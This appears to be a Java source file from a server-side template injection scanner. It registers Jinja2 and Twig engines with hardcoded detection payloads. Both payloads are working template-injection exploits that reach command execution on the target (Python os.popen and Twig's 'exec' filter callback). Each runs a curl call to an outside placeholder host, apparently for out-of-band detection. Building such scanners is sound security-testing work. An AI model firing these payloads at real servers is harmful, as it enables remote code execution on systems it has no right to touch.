package sstiscanner.engines;

import java.util.ArrayList;
import java.util.Collections;
import java.util.List;

public class Engines {

    private final List<Engine> engines = new ArrayList<>();

    public Engines() {
        initializeEngines();
    }

    public List<Engine> getEngines() {
        return Collections.unmodifiableList(engines);
    }

    private void initializeEngines() {
        addEngine("Jinja2", Payloads.JINJA2_PAYLOAD);
        addEngine("Twig", Payloads.TWIG_PAYLOAD);
    }

    private void addEngine(String name, String payload) {
        engines.add(new Engine(name, payload));
    }

    private static class Payloads {
        static final String JINJA2_PAYLOAD = "{% for x in ().__class__.__base__.__subclasses__() %}{% if \"warning\" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(\"curl jinja2.[PAYLOAD]\").read().zfill(417)}}{%endif%}{% endfor %}";
        static final String TWIG_PAYLOAD = "{{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"curl twig.[PAYLOAD]\")}}"; // Your Twig payload here
    }
}





